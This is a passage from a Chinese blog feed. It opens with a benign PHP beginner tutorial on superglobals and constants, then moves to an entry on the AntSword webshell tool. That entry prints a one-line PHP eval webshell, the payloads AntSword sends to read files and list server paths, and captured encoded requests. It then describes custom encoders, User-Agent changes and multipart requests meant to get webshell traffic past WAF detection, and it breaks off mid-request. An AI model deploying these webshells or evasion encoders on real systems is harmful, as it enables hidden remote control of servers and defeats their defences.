class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="POST变量"><a href="#POST变量" class="headerlink" title="$_POST变量"></a>$_POST变量</h4><p>steady.html</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;steady_post.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">数字<span class="number">1</span>&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;num1&quot;</span>&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">数字<span class="number">2</span>&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;num2&quot;</span>&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;计算！&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>steady_post.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$n1 = $_POST[<span class="string">&#x27;num1&#x27;</span>];</span><br><span class="line">$n2 = $_POST[<span class="string">&quot;num2&quot;</span>];</span><br><span class="line">$result = $n1 + $n2;</span><br><span class="line">$result2 = $_POST[<span class="string">&#x27;num1&#x27;</span>] + $_POST[<span class="string">&#x27;num2&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;相加计算的结果为：&quot;</span>, $result;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;相加计算的结果为：&quot;</span>, $result2;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="REQUEST变量"><a href="#REQUEST变量" class="headerlink" title="$_REQUEST变量"></a>$_REQUEST变量</h4><p>同上。</p><h4 id="SERVER变量"><a href="#SERVER变量" class="headerlink" title="$_SERVER变量"></a>$_SERVER变量</h4><p>任何一次请求中，客户端或服务器端的一些“基本信息”或系统信息。</p><p>常用的有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PHP_SELF：表示当前请求的网页地址（不含域名部分）</span><br><span class="line">SERVER_NAME： 表示当前请求的服务器名</span><br><span class="line">SERVER_ADDR：表示当前请求的服务器IP地址</span><br><span class="line">DOCUMENT_ROOT：表示当前请求的网站物理路径（apache设置站点时那个）</span><br><span class="line">REMOTE_ADDR：  表示当前请求的客户端的IP地址</span><br><span class="line">SCRIPT_NAME：表示当前网页地址</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// PHP_SELF：表示当前请求的网页地址（不含域名部分）</span></span><br><span class="line"><span class="comment">// SERVER_NAME： 表示当前请求的服务器名</span></span><br><span class="line"><span class="comment">// SERVER_ADDR：表示当前请求的服务器IP地址</span></span><br><span class="line"><span class="comment">// DOCUMENT_ROOT：表示当前请求的网站物理路径（apache设置站点时那个）</span></span><br><span class="line"><span class="comment">// REMOTE_ADDR：  表示当前请求的客户端的IP地址</span></span><br><span class="line"><span class="comment">// SCRIPT_NAME：表示当前网页地址</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;你访问的网页为：&quot;</span> , $_SERVER[<span class="string">&#x27;PHP_SELF&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;你访问的网站为：&quot;</span> , $_SERVER[<span class="string">&#x27;SERVER_NAME&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;你访问的网站物理路径为：&quot;</span> , $_SERVER[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;你的IP为：&quot;</span>,  $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">$ip = $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"></span><br><span class="line">file_put_contents(<span class="string">&quot;<span class="subst">$ip</span>.txt&quot;</span>, $ip)</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">你访问的网页为：/<span class="number">1.</span>php</span><br><span class="line">你访问的网站为：<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">你访问的网站物理路径为：/Applications/MAMP/htdocs</span><br><span class="line">你的IP为：<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br></pre></td></tr></table></figure><h3 id="可变变量"><a href="#可变变量" class="headerlink" title="可变变量"></a>可变变量</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$steady=<span class="number">10</span>;</span><br><span class="line">$b=<span class="string">&quot;steady&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $$b;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p> 输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10</span><br></pre></td></tr></table></figure><h3 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h3><p>常量的变量名字常用大小表示。</p><h4 id="常量的两种定义形式"><a href="#常量的两种定义形式" class="headerlink" title="常量的两种定义形式"></a>常量的两种定义形式</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">&quot;STEADY&quot;</span>,<span class="string">&quot;steady&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> DELLY=<span class="string">&quot;steady&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> STEADY;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.DELLY;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steady</span><br><span class="line">steady</span><br></pre></td></tr></table></figure><h4 id="常量的两种取值形式"><a href="#常量的两种取值形式" class="headerlink" title="常量的两种取值形式"></a>常量的两种取值形式</h4><h5 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h5><p>echo  常量名;//注意：使用常量，前面不带”$”符号，也不能有引号</p><h5 id="使用constant-函数以取值："><a href="#使用constant-函数以取值：" class="headerlink" title="使用constant()函数以取值："></a>使用constant()函数以取值：</h5><p>echo  constant(‘常量名’);//注意，此时常量名要用引号引起来。</p><h3 id="预定义常量"><a href="#预定义常量" class="headerlink" title="预定义常量"></a>预定义常量</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">预定义常量就是PHP语言内部预先定义好的常量，我们可以直接使用。</span><br><span class="line">比如：PHP_VERSION,  PHP_OS,  PHP_INT_MAX,  M_PI等。</span><br><span class="line">PHP_VERSION：表示当前php的版本信息</span><br><span class="line">PHP_OS：表示当前php运行所在的系统信息</span><br><span class="line">PHP_INT_MAX：表示当前版本的php中的最大的整数值</span><br><span class="line">M_PI： 表示圆周率π（一个有<span class="number">10</span>多位小数的数）</span><br></pre></td></tr></table></figure><h3 id="魔术常量"><a href="#魔术常量" class="headerlink" title="魔术常量"></a>魔术常量</h3><p>魔术常量也是常量，只是在形式上为常量，而其值其实是“变化”的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__DIR__：代表当前php网页文件所在的目录</span><br><span class="line">__FILE__：代表当前php网页文件本身的路径</span><br><span class="line">__LINE__  ：代表当前这个常量所在的行号</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">最大的整数：9223372036854775807</span><br><span class="line">圆周率pi为：3.14159265359</span><br><span class="line">下面演示3个魔术常量</span><br><span class="line"></span><br><span class="line">当前网页所在路径：&#x2F;Applications&#x2F;MAMP&#x2F;htdocs</span><br><span class="line">当前网页文件路径：&#x2F;Applications&#x2F;MAMP&#x2F;htdocs&#x2F;1.php</span><br><span class="line">当前这一行的行号：9</span><br><span class="line">当前这一行的行号：10</span><br></pre></td></tr></table></figure><h3 id="错误抑制符"><a href="#错误抑制符" class="headerlink" title="错误抑制符"></a>错误抑制符</h3><p>在一个表达式出现错误的时候，可以将错误“隐藏”（掩盖）起来（不输出）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(@mysqli_connect(&#39;localhost&#39;,&#39;root&#39;,&#39;123&#39;))&#123;</span><br><span class="line">.......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PHP开发学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP开发学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>蚁剑—bypass</title>
      <link href="2019/10/28/%E8%9A%81%E5%89%91%E4%BD%BF%E7%94%A8--Bypass%20Waf/"/>
      <url>2019/10/28/%E8%9A%81%E5%89%91%E4%BD%BF%E7%94%A8--Bypass%20Waf/</url>
      
        <content type="html"><![CDATA[<h1 id="蚁剑的工作原理"><a href="#蚁剑的工作原理" class="headerlink" title="蚁剑的工作原理"></a>蚁剑的工作原理</h1><h2 id="连接shell"><a href="#连接shell" class="headerlink" title="连接shell"></a>连接shell</h2><p>一句话shell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>蚁剑会发送post包，给cmd参数传递不同操作对应的php代码，比如连接shell的时候传递</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params">$out</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $out;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $output=ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;595fa0323f&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> @asenc($output);</span><br><span class="line">    <span class="keyword">echo</span><span class="string">&quot;da825&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">ob_start();</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    $D=dirname($_SERVER[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line">    <span class="keyword">if</span>($D==<span class="string">&quot;&quot;</span>)</span><br><span class="line">$D=dirname($_SERVER[<span class="string">&quot;PATH_TRANSLATED&quot;</span>]);</span><br><span class="line">    $R=<span class="string">&quot;<span class="subst">&#123;$D&#125;</span>&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(substr($D,<span class="number">0</span>,<span class="number">1</span>)!=<span class="string">&quot;/&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">foreach</span>(range(<span class="string">&quot;C&quot;</span>,<span class="string">&quot;Z&quot;</span>)<span class="keyword">as</span> $L)</span><br><span class="line">        <span class="keyword">if</span>(is_dir(<span class="string">&quot;<span class="subst">&#123;$L&#125;</span>:&quot;</span>))</span><br><span class="line">        $R.=<span class="string">&quot;<span class="subst">&#123;$L&#125;</span>:&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $R.=<span class="string">&quot;/&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $R.=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    $u=(function_exists(<span class="string">&quot;posix_getegid&quot;</span>))?@posix_getpwuid(@posix_geteuid()):<span class="string">&quot;&quot;</span>;</span><br><span class="line">    $s=($u)?$u[<span class="string">&quot;name&quot;</span>]:@get_current_user();</span><br><span class="line">    $R.=php_uname();</span><br><span class="line">    $R.=<span class="string">&quot;<span class="subst">&#123;$s&#125;</span>&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> $R;;</span><br><span class="line">&#125; <span class="keyword">catch</span>(<span class="built_in">Exception</span> $e)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span>.$e-&gt;getMessage();</span><br><span class="line">&#125;;</span><br><span class="line">asoutput();</span><br><span class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure><p>查看php文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params">$out</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $out;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $output=ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;7545b34&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> @asenc($output);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;644b58cc3bac&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">ob_start();</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    $F=base64_decode($_POST[<span class="string">&quot;x7e381bdf1773a&quot;</span>]);</span><br><span class="line">    $P=@fopen($F,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span>(@fread($P,filesize($F)?filesize($F):<span class="number">4096</span>));</span><br><span class="line">    @fclose($P);;</span><br><span class="line">&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> $e)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span>.$e-&gt;getMessage();</span><br><span class="line">&#125;;</span><br><span class="line">asoutput();</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&amp;x7e381bdf1773a=RTovcGhwc3R1ZHkvcGhwc3R1ZHlfcHJvL1dXVy9zcWxpMS9MZXNzLTEvaW5kZXgucGhw</span><br></pre></td></tr></table></figure><h1 id="蚁剑使用–Bypass-Waf"><a href="#蚁剑使用–Bypass-Waf" class="headerlink" title="蚁剑使用–Bypass Waf"></a>蚁剑使用–Bypass Waf</h1><h2 id="修改蚁剑UA"><a href="#修改蚁剑UA" class="headerlink" title="修改蚁剑UA"></a>修改蚁剑UA</h2><h3 id="全局设置中添加请求头"><a href="#全局设置中添加请求头" class="headerlink" title="全局设置中添加请求头"></a>全局设置中添加请求头</h3><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201011145536824.png" alt="image-20201011145536824"></p><h3 id="单独的webshell添加请求头"><a href="#单独的webshell添加请求头" class="headerlink" title="单独的webshell添加请求头"></a>单独的webshell添加请求头</h3><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201011150536317.png" alt="image-20201011150536317"></p><h3 id="修改源代码"><a href="#修改源代码" class="headerlink" title="修改源代码"></a>修改源代码</h3><p>在项目路径<code>.modules/request.js</code>中进行修改:</p><p>另外项目路径下的<code>.modules/update.js</code>也需要修改：</p><h2 id="使用Multipart发包"><a href="#使用Multipart发包" class="headerlink" title="使用Multipart发包"></a>使用Multipart发包</h2><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201012084450973.png" alt="image-20201012084450973"></p><p>数据会以post的表单形式发送。</p><h2 id="编码器"><a href="#编码器" class="headerlink" title="编码器"></a>编码器</h2><h3 id="编码器的作用"><a href="#编码器的作用" class="headerlink" title="编码器的作用"></a>编码器的作用</h3><p>当使用蚁剑控制webshell向服务器发送数据包时，数据包中的body部分会按照编码器中定义的规则进行编码或者加密后在发送，这样就可以避免有比较明显的命令执行特征从儿被WAF拦截。</p><h3 id="蚁剑的编码器规则"><a href="#蚁剑的编码器规则" class="headerlink" title="蚁剑的编码器规则"></a>蚁剑的编码器规则</h3><p>以下规则就是蚁剑的默认编码规则，如图：</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201011165700645.png" alt="image-20201011165700645"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * php::base64编码器</span></span><br><span class="line"><span class="comment"> * Create at: 2020/08/19 7:30:36</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* @param  &#123;String&#125; pwd   连接密码</span></span><br><span class="line"><span class="comment">* @param  &#123;Array&#125;  data  编码器处理前的 payload 数组</span></span><br><span class="line"><span class="comment">* @return &#123;Array&#125;  data  编码器处理后的 payload 数组</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function">(<span class="params">pwd, data, ext=&#123;&#125;</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// ##########    请在下方编写你自己的代码   ###################</span></span><br><span class="line">  <span class="comment">// 以下代码为 PHP Base64 样例</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 生成一个随机变量名</span></span><br><span class="line">  <span class="keyword">let</span> randomID = <span class="string">`_0x<span class="subst">$&#123;<span class="built_in">Math</span>.random().toString(<span class="number">16</span>).substr(<span class="number">2</span>)&#125;</span>`</span>;</span><br><span class="line">  <span class="comment">// 原有的 payload 在 data[&#x27;_&#x27;]中</span></span><br><span class="line">  <span class="comment">// 取出来之后，转为 base64 编码并放入 randomID key 下</span></span><br><span class="line">  data[randomID] = Buffer.from(data[<span class="string">&#x27;_&#x27;</span>]).toString(<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// shell 在接收到 payload 后，先处理 pwd 参数下的内容，</span></span><br><span class="line">  data[pwd] = <span class="string">`eval(base64_decode($_POST[<span class="subst">$&#123;randomID&#125;</span>]));`</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ##########    请在上方编写你自己的代码   ###################</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 删除 _ 原有的payload</span></span><br><span class="line">  <span class="keyword">delete</span> data[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line">  <span class="comment">// 返回编码器处理后的 payload 数组</span></span><br><span class="line">  <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整个代码是一个module.exports函数，其中有三个参数pwd、data、ext。</p><ul><li>pwd: 类型是String, 这个是 shell 的连接密码</li><li>data: 类型是 Array, 这个是要发送的 HTTP POST 数据包</li><li>ext: 它是个对象，这个是一些扩展参数</li></ul><p>在自定义编码方式时只需要去修改<code>data[&#39;_&#39;]</code>中的内容就可以了。</p><p>将蚁剑使用burp代理拦截，查看请求。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /steady.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8888</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">User-Agent: antSword/v2<span class="number">.1</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: <span class="number">948</span></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">_0xe804371f038f9=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7ZnVuY3Rpb24gYXNlbmMoJG91dCl7cmV0dXJuICRvdXQ7fTtmdW5jdGlvbiBhc291dHB1dCgpeyRvdXRwdXQ9b2JfZ2V0X2NvbnRlbnRzKCk7b2JfZW5kX2NsZWFuKCk7ZWNobyAiZTgxZjMyNjlmNjczIjtlY2hvIEBhc2VuYygkb3V0cHV0KTtlY2hvICJiMDkxMTRjNSI7fW9iX3N0YXJ0KCk7dHJ5eyREPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTtpZigkRD09IiIpJEQ9ZGlybmFtZSgkX1NFUlZFUlsiUEFUSF9UUkFOU0xBVEVEIl0pOyRSPSJ7JER9CSI7aWYoc3Vic3RyKCRELDAsMSkhPSIvIil7Zm9yZWFjaChyYW5nZSgiQyIsIloiKWFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9ZWxzZXskUi49Ii8iO30kUi49IgkiOyR1PShmdW5jdGlvbl9leGlzdHMoInBvc2l4X2dldGVnaWQiKSk%<span class="number">2</span>FQHBvc2l4X2dldHB3dWlkKEBwb3NpeF9nZXRldWlkKCkpOiIiOyRzPSgkdSk%<span class="number">2</span>FJHVbIm5hbWUiXTpAZ2V0X2N1cnJlbnRfdXNlcigpOyRSLj1waHBfdW5hbWUoKTskUi49Igl7JHN9IjtlY2hvICRSOzt9Y2F0Y2goRXhjZXB0aW9uICRlKXtlY2hvICJFUlJPUjovLyIuJGUtPmdldE1lc3NhZ2UoKTt9O2Fzb3V0cHV0KCk7ZGllKCk7&amp;cmd=eval(base64_decode(%<span class="number">24</span>_POST%<span class="number">5</span>B_0xe804371f038f9%<span class="number">5</span>D))%<span class="number">3</span>B</span><br></pre></td></tr></table></figure><p>但是我们看到代码中有eval函数，很容易被waf拦截。接下来我们我们尝试编辑绕过waf。</p><h3 id="编码器规则绕过Waf"><a href="#编码器规则绕过Waf" class="headerlink" title="编码器规则绕过Waf"></a>编码器规则绕过Waf</h3><h4 id="Base64编码"><a href="#Base64编码" class="headerlink" title="Base64编码"></a>Base64编码</h4><p>为了避免waf识别eval等敏感函数，我们可以对其进行base64编码，将cmd的值base64编码也就是对<code>data[pwd]</code>的内容进行base64编码。</p><p>这里我们直接把原有的payloadbase64进行编码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; ##########    请在下方编写你自己的代码   ###################</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; shell 在接收到 payload 后，先处理 pwd 参数下的内容，</span><br><span class="line">data[pwd] &#x3D; Buffer.from(data[&#39;_&#39;]).toString(&#39;base64&#39;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; ##########    请在上方编写你自己的代码   ###################</span><br></pre></td></tr></table></figure><p>查看一下payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /steady.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8888</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">User-Agent: antSword/v2<span class="number">.1</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: <span class="number">868</span></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span 